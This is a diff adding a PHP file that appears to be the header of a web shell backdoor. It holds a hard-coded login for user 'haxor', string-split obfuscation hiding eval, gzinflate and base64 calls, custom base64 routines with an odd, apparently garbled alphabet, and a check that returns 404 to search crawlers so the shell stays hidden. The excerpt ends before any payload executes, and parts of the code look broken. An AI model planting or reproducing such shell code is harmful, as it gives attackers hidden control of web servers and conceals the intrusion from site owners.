@@ -1,0 +1,168 @@
+
+<?php
+
+$GLOBALS['T34M_C4RT3L'] = array(
+    'username' => 'haxor',
+    'password' => '7d793037a0760186574b0282f2f435e7',
+    'safe_mode' => '0',
+    'login_page' => 'gui',
+    'show_icons' => '1',
+    'post_encryption' => true,
+    'cgi_api' => true,
+);
+
+$Love = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
+$Hope = 'cha' . 'r' . 'C' . 'o' . 'd' . 'e' . 'A' . 't' . '';
+$Destiny = 'e' . 'v' . 'al';
+$Purpose = 'gz' . 'inf' . 'late';
+
+if (!$Love('b' . 'a' . 'se64' . '_en' . 'c' . 'ode' . ''))
+{
+    function vcnvSCZgBz($data)
+    {
+        if (empty($data)) return;
+        $b64 = 'ABCDEFGHIJKLeuNSuRp6A52HGLpV5o67WLrb9CiQiCAkdtuvwxyz0123456789+/=';
+        $o1 = $o2 = $o3 = $h1 = $h2 = $h3 = $h4 = $bits = $i = 0;
+        $ac = 0;
+        $enc = '';
+        $tmp_arr = array();
+        if (!$data)
+        {
+            return $data;
+        }
+        do
+        {
+            $o1 = $Hope($data, $i++);
+            $o2 = $Hope($data, $i++);
+            $o3 = $Hope($data, $i++);
+            $bits = $o1 << 16 | $o2 << 8 | $o3;
+            $h1 = $bits >> 18 & 0x3f;
+            $h2 = $bits >> 12 & 0x3f;
+            $h3 = $bits >> 6 & 0x3f;
+            $h4 = $bits & 0x3f;
+            $tmp_arr[$ac++] = charAt($b64, $h1) . charAt($b64, $h2) . charAt($b64, $h3) . charAt($b64, $h4);
+        }
+        while ($i < strlen($data));
+        $enc = implode($tmp_arr, '');
+        $r = (strlen($data) % 3);
+        return ($r ? substr($enc, 0, ($r - 3)) : $enc) . substr('===', ($r || 3));
+    }
+    function charCodeAt($data, $char)
+    {
+        return ord(substr($data, $char, 1));
+    }
+    function charAt($data, $char)
+    {
+        return substr($data, $char, 1);
+    }
+}
+else
+{
+    function vcnvSCZgBz($s)
+    {
+        $b = 'b' . 'a' . 'se64' . '_en' . 'c' . 'ode' . '';
+        return $b($s);
+    }
+}
+if (!$Love('b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . ''))
+{
+    function zRtSHsbTzV($input)
+    {
+        if (empty($input)) return;
+        $keyStr = "ABCDEFGHIJKLeuNSuRp6A52HGLpV5o67WLrb9CiQiCAkdtuvwxyz0123456789+/=";
+        $chr1 = $chr2 = $chr3 = "";
+        $enc1 = $enc2 = $enc3 = $enc4 = "";
+        $i = 0;
+        $output = "";
+        $input = preg_replace("[^A-Za-z0-9\+\/\=]", "", $input);
+        do
+        {
+            $enc1 = strpos($keyStr, substr($input, $i++, 1));
+            $enc2 = strpos($keyStr, substr($input, $i++, 1));
+            $enc3 = strpos($keyStr, substr($input, $i++, 1));
+            $enc4 = strpos($keyStr, substr($input, $i++, 1));
+            $chr1 = ($enc1 << 2) | ($enc2 >> 4);
+            $chr2 = (($enc2 & 15) << 4) | ($enc3 >> 2);
+            $chr3 = (($enc3 & 3) << 6) | $enc4;
+            $output = $output . chr((int)$chr1);
+            if ($enc3 != 64)
+            {
+                $output = $output . chr((int)$chr2);
+            }
+            if ($enc4 != 64)
+            {
+                $output = $output . chr((int)$chr3);
+            }
+            $chr1 = $chr2 = $chr3 = "";
+            $enc1 = $enc2 = $enc3 = $enc4 = "";
+        }
+        while ($i < strlen($input));
+        return $output;
+    }
+}
+else
+{
+    function zRtSHsbTzV($s)
+    {
+        $b = 'b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . '';
+        return $b($s);
+    }
+}
+
+function __ZW5jb2Rlcg($s)
+{
+    return vcnvSCZgBz($s);
+}
+function __ZGVjb2Rlcg($s)
+{
+    return zRtSHsbTzV($s);
+}
+
+$GLOBALS['DB_NAME'] = $GLOBALS['T34M_C4RT3L'];
+
+foreach ($GLOBALS['DB_NAME'] as $key => $value)
+{
+	$prefix = substr($key, 0, 2);
+	if ($prefix == "us")
+	{
+		$GLOBALS['DB_NAME']["user"] = $value;
+		$GLOBALS['DB_NAME']["user_rand"] = $key;
+	}
+	elseif ($prefix == "pa")
+	{
+		$GLOBALS['DB_NAME']["pass"] = $value;
+		$GLOBALS['DB_NAME']["pass_rand"] = $key;
+	}
+	elseif ($prefix == "sa")
+	{
+		$GLOBALS['DB_NAME']["safemode"] = $value;
+		$GLOBALS['DB_NAME']["safemode_rand"] = $key;
+	}
+	elseif ($prefix == "lo")
+	{
+		$GLOBALS['DB_NAME']["login_page"] = $value;
+		$GLOBALS['DB_NAME']["login_page_rand"] = $key;
+	}
+	elseif ($prefix == "sh")
+	{
+		$GLOBALS['DB_NAME']["show_icons"] = $value;
+		$GLOBALS['DB_NAME']["show_icons_rand"] = $key;
+	}
+	elseif ($prefix == "po")
+	{
+		$GLOBALS['DB_NAME']["post_encryption"] = $value;
+		$GLOBALS['DB_NAME']["post_encryption_rand"] = $key;
+	}
+	elseif ($prefix == "cg")
+	{
+		$GLOBALS['DB_NAME']["cgi_api"] = $value;
+		$GLOBALS['DB_NAME']["cgi_api_rand"] = $key;
+	}
+}
+
+unset($GLOBALS['T34M_C4RT3L']);
+
+if (!isset($_SERVER["HTTP_HOST"])) exit();
+
+if(!empty($_SERVER['HTTP_USER_AGENT'])){$userAgents = array("Google","Slurp","MSNBot","ia_archiver","Yandex","Rambler","bot","spider");if(preg_match('/'.implode('|',$userAgents).'/i',$_SERVER['HTTP_USER_AGENT'])){header('HTTP/1.0 404 Not Found');exit;}}
+if(!isset($GLOBALS['DB_NAME']['user']))exit('$GLOBALS[\'DB_NAME\'][\'user\']');
